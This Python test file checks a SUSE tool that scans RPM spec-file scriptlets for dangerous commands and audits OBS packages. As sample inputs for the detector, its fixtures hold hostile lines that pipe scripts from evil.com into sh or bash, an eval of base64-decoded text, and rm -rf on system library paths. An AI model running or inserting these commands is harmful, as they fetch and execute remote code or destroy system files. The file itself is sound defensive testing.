# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""Tests for SUSE security audit functionality (spec file analysis and OBS package audit)."""

from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

from suse_ops_server.obs import analyze_spec_security, audit_obs_package


SAFE_SPEC = """\
Name:           vim
Version:        9.1.0330
Release:        1
Summary:        Vi IMproved
License:        Vim
URL:            https://www.vim.org

%description
Vim is an advanced text editor.

%prep
%autosetup

%build
%configure
%make_build

%install
%make_install

%pre
getent group vim >/dev/null || groupadd -r vim

%post
update-alternatives --install /usr/bin/vi vi %{_bindir}/vim 20

%files
%{_bindir}/vim
"""

DANGEROUS_SPEC = """\
Name:           malicious-pkg
Version:        1.0
Release:        1
Summary:        Bad package
License:        GPL

%description
A dangerous package.

%pre
curl https://evil.com/backdoor.sh | sh

%post
eval $(echo aGVsbG8= | base64 -d)
rm -rf /usr/lib/security

%files
/usr/bin/malicious
"""


class TestAnalyzeSpecSecurity:
    """Test analyze_spec_security with various spec file inputs."""

    def test_safe_spec_no_risks(self):
        result = analyze_spec_security(SAFE_SPEC)
        assert result["has_risks"] is False
        assert result["risk_count"] == 0
        assert result["risks"] == []

    def test_dangerous_spec_detects_risks(self):
        result = analyze_spec_security(DANGEROUS_SPEC)
        assert result["has_risks"] is True
        assert result["risk_count"] >= 2

    def test_curl_pipe_sh_in_pre(self):
        spec = "%pre\ncurl https://evil.com/x.sh | sh\n%files\n/usr/bin/x\n"
        result = analyze_spec_security(spec)
        assert result["has_risks"] is True
        risk = result["risks"][0]
        assert risk["scriptlet"] == "%pre"
        assert "shell" in risk["description"].lower() or "curl" in risk["description"].lower()

    def test_wget_pipe_sh(self):
        spec = "%post\nwget -q https://evil.com/x.sh | bash\n%files\n/usr/bin/x\n"
        result = analyze_spec_security(spec)
        assert result["has_risks"] is True

    def test_eval_base64(self):
        spec = "%pre\neval $(echo aGVsbG8= | base64 -d)\n%files\n/usr/bin/x\n"
        result = analyze_spec_security(spec)
        assert result["has_risks"] is True
        assert any("base64" in r["description"].lower() for r in result["risks"])

    def test_rm_rf_root(self):
        spec = "%post\nrm -rf /usr/lib/something\n%files\n/usr/bin/x\n"
        result = analyze_spec_security(spec)
        assert result["has_risks"] is True
        assert any("root" in r["description"].lower() or "delete" in r["description"].lower() or "filesystem" in r["description"].lower() for r in result["risks"])

    def test_risk_outside_scriptlet_not_flagged(self):
        """Risky patterns outside scriptlets should not be flagged."""
        spec = "# curl https://evil.com | sh\n%prep\n%autosetup\n%files\n/usr/bin/x\n"
        result = analyze_spec_security(spec)
        assert result["has_risks"] is False

    def test_empty_spec(self):
        result = analyze_spec_security("")
        assert result["has_risks"] is False
        assert result["risk_count"] == 0

    def test_multiple_scriptlets(self):
        spec = (
            "%pre\ncurl https://evil.com | sh\n"
            "%post\nrm -rf /lib\n"
            "%files\n/usr/bin/x\n"
        )
        result = analyze_spec_security(spec)
        assert result["risk_count"] >= 2
        scriptlets = {r["scriptlet"] for r in result["risks"]}
        assert "%pre" in scriptlets
        assert "%post" in scriptlets


class TestAuditObsPackage:
    """Test audit_obs_package as a unified security audit entry point."""

    def _mock_client(self, spec_content):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = spec_content
        mock_resp.raise_for_status = MagicMock()
        mock = MagicMock()
        mock.__aenter__ = AsyncMock(return_value=mock)
        mock.__aexit__ = AsyncMock(return_value=False)
        mock.get = AsyncMock(return_value=mock_resp)
        return mock

    @pytest.mark.asyncio
    async def test_audit_safe_package(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_client.return_value)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)
            mock_client.return_value.get = AsyncMock(
                return_value=self._make_response(200, SAFE_SPEC)
            )
            result = await audit_obs_package("vim")
            assert result["package"] == "vim"
            assert result["security"]["has_risks"] is False
            assert "no obvious" in result["recommendation"].lower()

    @pytest.mark.asyncio
    async def test_audit_dangerous_package(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_client.return_value)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)
            mock_client.return_value.get = AsyncMock(
                return_value=self._make_response(200, DANGEROUS_SPEC)
            )
            result = await audit_obs_package("malicious-pkg")
            assert result["security"]["has_risks"] is True
            assert "caution" in result["recommendation"].lower()

    @pytest.mark.asyncio
    async def test_audit_package_not_found(self):
        mock_resp = MagicMock()
        mock_resp.status_code = 404
        http_err = httpx.HTTPStatusError(
            "Not Found", request=MagicMock(), response=mock_resp
        )
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_client.return_value)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)
            mock_client.return_value.get = AsyncMock(side_effect=http_err)
            result = await audit_obs_package("nonexistent")
            assert result["error"] is True
            assert result["type"] == "NotFound"

    @pytest.mark.asyncio
    async def test_audit_custom_project(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_client.return_value)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)
            mock_client.return_value.get = AsyncMock(
                return_value=self._make_response(200, SAFE_SPEC)
            )
            result = await audit_obs_package("vim", project="home:user:branch")
            assert result["project"] == "home:user:branch"

    @staticmethod
    def _make_response(status_code, text=""):
        mock = MagicMock()
        mock.status_code = status_code
        mock.text = text
        mock.raise_for_status = MagicMock()
        if status_code >= 400:
            mock.raise_for_status.side_effect = httpx.HTTPStatusError(
                f"HTTP {status_code}", request=MagicMock(), response=mock
            )
        return mock
